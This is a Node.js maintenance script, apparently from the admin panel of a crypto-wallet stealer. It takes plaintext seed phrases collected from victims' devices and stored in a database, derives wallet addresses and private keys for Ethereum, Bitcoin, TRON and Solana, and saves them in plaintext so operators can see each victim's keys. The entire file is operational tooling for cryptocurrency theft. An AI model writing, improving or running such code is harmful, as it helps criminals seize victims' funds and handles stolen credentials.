#!/usr/bin/env node
/**
 * pg_derive_generate.js —— 助记词 → 标准地址生成器（面板可见）
 *   对 PG 中每条明文助记词，按标准路径派生出"该钱包应有的地址"（仅热门链）：
 *   EVM(ETH) · BTC(44/49/84/86) · TRON · SOL（每系列前 idx 个，默认 5；热门链口径可直接在
 *   derive_batch.py 生成模式里扩展）。
 *   以 src=derived 标记入库 → 设备只上报了助记词没传地址时，面板也能看到其钱包地址（含私钥）。
 *   幂等：ukey=serial|public_key —— 已存在的地址（无论来源）自动跳过，不产生重复。
 * 用法: node tools/pg_derive_generate.js [--idx 5] [--limit N] [--dry]
 */
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const BASE = path.resolve(__dirname, '..');
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));
const { execFileSync } = require('child_process');

const args = process.argv.slice(2);
const IDX = (() => { const i = args.indexOf('--idx'); return i >= 0 ? Number(args[i + 1]) : 5; })();
const LIMIT = (() => { const i = args.indexOf('--limit'); return i >= 0 ? Number(args[i + 1]) : 0; })();
const DRY = args.includes('--dry');
const abbr6 = s => { s = String(s); return s.length <= 15 ? s : s.slice(0, 6) + '***' + s.slice(-6); };

// 【2026-09-14 提速】生成状态：该助记词（当前口径版本）已生成过 → 直接跳过（免 python 重跑）。
//   口径升级时改 GEN_VER 即可让旧状态失效、自动重生成。
const GEN_VER = 'v1-sixchains';
const stateFile = path.join(BASE, 'adm888app', 'data', 'derive_gen_state.json');
let genState = {};
try { genState = JSON.parse(fs.readFileSync(stateFile, 'utf8')); } catch {}

// 【2026-09-14 按需生成】把设备上报的 chain 标签映射成生成器币种白名单：
//   只给"设备实际上报过地址"的链生成候选地址（+ 同类兜底），不再无脑全 6 链；
//   该设备没有任何可识别链上报时 → 回退全 6 链（保守，保证补私钥能力不丢）。
//   coin(n) 标签按 SLIP-44 数字映射；同族别名（MetaMask/BSC→EVM，Exodus→EVM 等）按主流钱包习惯归类。
const EVM_COINS = [60, 61, 137, 714, 966, 118, 500];
function canonChain(label) {
  const s = String(label || '').trim();
  const u = s.toUpperCase();
  if (u === 'BTC') return 'BTC';
  if (u === 'LTC') return 'LTC';
  if (u === 'DOGE') return 'DOGE';
  if (u === 'TRON' || u === 'TRX') return 'TRON';
  if (u === 'SOL' || u === 'SOLANA') return 'SOL';
  if (u === 'ETH' || u === 'ETHEREUM' || u === 'EVM') return 'EVM';
  if (u.startsWith('COIN') && /^\d+$/.test(s.slice(4))) {
    const c = Number(s.slice(4));
    if (c === 0 || c === 145) return 'BTC';
    if (c === 2) return 'LTC';
    if (c === 3) return 'DOGE';
    if (c === 195 || c === 199) return 'TRON';
    if (c === 501) return 'SOL';
    if ([60, 61, 137, 714, 966, 118, 500].includes(c)) return 'EVM';
    return '';   // 其它 alt 链：生成器暂不支持，忽略
  }
  if (/^(METAMASK|BSC|BINANCE|POLYGON|ARBITRUM|OPTIMISM|AVALANCHE|BASE|LINEA|SCROLL|ZKSYNC)/.test(u)) return 'EVM';
  if (/^(PHANTOM.*(EIP155|SOLANA))/.test(u)) return u.includes('SOLANA') ? 'SOL' : 'EVM';
  if (u === 'EXODUS' || u === 'BITGET' || u === 'IMTOKEN' || u === 'TRUST' || u === 'WALLET') return 'EVM';
  if (u.startsWith('OKX-')) {
    if (u.includes('BTC')) return 'BTC';
    if (u.includes('LTC')) return 'LTC';
    if (u.includes('DOGE')) return 'DOGE';
    if (u.includes('TRON') || u.includes('TRX')) return 'TRON';
    if (u.includes('SOL')) return 'SOL';
    if (u.includes('ETH') || u.includes('BSC') || u.includes('ARBITRUM') || u.includes('ZKSYNC')) return 'EVM';
    return '';
  }
  return '';
}
function coinsOf(canon) {
  switch (canon) {
    case 'BTC': return [0];
    case 'LTC': return [2];
    case 'DOGE': return [3];
    case 'TRON': return [195];
    case 'SOL': return [501];
    case 'EVM': return [60];
    default: return [];
  }
}

(async () => {
  const mnR = await pgStore.pool.query("SELECT serial, plain FROM mnemonics WHERE serial IS NOT NULL AND serial <> '' AND plain IS NOT NULL AND plain <> '' ORDER BY serial");
  // 每设备「缺私钥」的链标签（去重）——只对这些链生成候选地址（有私钥的链无需生成）
  const chR = await pgStore.pool.query("SELECT DISTINCT serial, chain FROM addresses WHERE serial IS NOT NULL AND serial <> '' AND chain IS NOT NULL AND chain <> '' AND private_key_plain IS NULL");
  const chainsBySerial = {};
  for (const x of chR.rows) (chainsBySerial[x.serial] = chainsBySerial[x.serial] || []).push(x.chain);
  // 设备 → 生成币种白名单（null = 全量）
  const coinsBySerial = {};
  for (const [s, labels] of Object.entries(chainsBySerial)) {
    const set = new Set();
    let any = false;
    for (const lb of labels) {
      const cc = canonChain(lb);
      if (!cc) continue;
      any = true;
      for (const c of coinsOf(cc)) set.add(c);
    }
    coinsBySerial[s] = any ? [...set].sort((a, b) => a - b) : null;
  }
  const seen = new Set();
  const list = [];
  for (const r of mnR.rows) {
    const k = r.serial + '|' + r.plain;
    if (seen.has(k)) continue;   // 同设备同明文只跑一次
    seen.add(k);
    list.push(r);
  }
  const targets = LIMIT > 0 ? list.slice(0, LIMIT) : list;
  console.log(`[gen] 助记词 ${list.length} 条（本次 ${targets.length}），索引 0..${IDX - 1}，按需生成=${targets.filter(t => coinsBySerial[t.serial]).length} 全量=${targets.filter(t => !coinsBySerial[t.serial]).length}`);

  let total = 0, ins = 0, skipped = 0;
  for (const r of targets) {
    try {
      // 【提速】已按当前口径生成过 → 秒级跳过（不 spawn python）
      const genCoins = coinsBySerial[r.serial];   // undefined/null = 全量
      const gkey = crypto.createHash('sha1')
        .update(GEN_VER + '|' + r.serial + '|' + r.plain + '|' + (genCoins ? genCoins.join(',') : 'all')).digest('hex');
      if (genState[gkey] && !DRY) { skipped++; continue; }
      const payload = { mnemonic: r.plain, generate: true, genIdx: IDX };
      if (genCoins) payload.genCoins = genCoins;
      const out = execFileSync('/usr/bin/python3', [path.join(BASE, 'adm888app', 'derive_batch.py')],
        { input: JSON.stringify(payload), maxBuffer: 16 * 1024 * 1024, timeout: 180000 }).toString();
      const d = JSON.parse(out);
      const gens = d.generated || [];
      total += gens.length;
      if (!gens.length) { console.log(`  ${r.serial}: 0 条（助记词无效？）`); continue; }
      if (DRY) { console.log(`  ${r.serial}: 将生成 ${gens.length} 条（dry）`); continue; }
      const now = Date.now();
      const recs = gens.map(g => ({
        id: 0, user_id: 0, serial: r.serial, ip: '', ts: now,
        public_key: g.addr, public_key_abbr: abbr6(g.addr),
        private_key_plain: g.private_key, private_key_abbr: abbr6(g.private_key),
        chain: g.chain, coin: null, derivation_path: g.path,
        src: 'derived', note: '由助记词派生（服务器生成，非设备采集）',
      }));
      // 【2026-09-15】源级去重：同设备同地址已存在（不论来源/ukey）→ 过滤，杜绝重复入库
      //   （实测踩坑：设备采集行与派生行字段不同 → ukey 不同 → ON CONFLICT 不触发）
      // 【2026-09-17】判存改大小写不敏感：既有行可能是混合大小写（wallet18 同步产物），
      //   精确匹配会漏判 → 被小写合并删除后会重建 → 与去重兜底互相打架（重复通知循环）
      let fresh = recs;
      try {
        const rr = await pgStore.pool.query(
          `SELECT lower(public_key) AS lpk FROM addresses WHERE serial = $1 AND lower(public_key) = ANY($2::text[])`,
          [r.serial, recs.map(x => String(x.public_key).toLowerCase())]);
        const exist = new Set(rr.rows.map(x => String(x.lpk)));
        if (exist.size) fresh = recs.filter(x => !exist.has(String(x.public_key).toLowerCase()));
      } catch (e) {}
      if (!fresh.length) {
        genState[gkey] = Date.now();
        console.log(`  ${r.serial}: 生成 ${gens.length} 条全部已存在，跳过`);
        continue;
      }
      const c = await pgStore.upsertRecords({ addresses: fresh });
      ins += c.ins;
      genState[gkey] = Date.now();
      console.log(`  ${r.serial}: 生成 ${gens.length} 条 → 新入库 ${c.ins}`);
    } catch (e) { console.log(`  ${r.serial}: 失败 ${String(e.message).slice(0, 100)}`); }
  }
  console.log(`\n[gen] 完成：生成 ${total} 条，新入库 ${ins} 条，跳过 ${skipped} 条（已生成过）`);
  // 状态文件精简：只保留最近 30 天（防止无上限膨胀；30 天内已生成过的必然仍在 PG 里）
  try {
    const cut = Date.now() - 30 * 86400000;
    const kept = {};
    for (const k of Object.keys(genState)) if (Number(genState[k]) >= cut) kept[k] = genState[k];
    fs.writeFileSync(stateFile, JSON.stringify(kept));
  } catch {}
  await pgStore.close();
})().catch(e => { console.error('[gen] fatal', e); process.exit(1); });
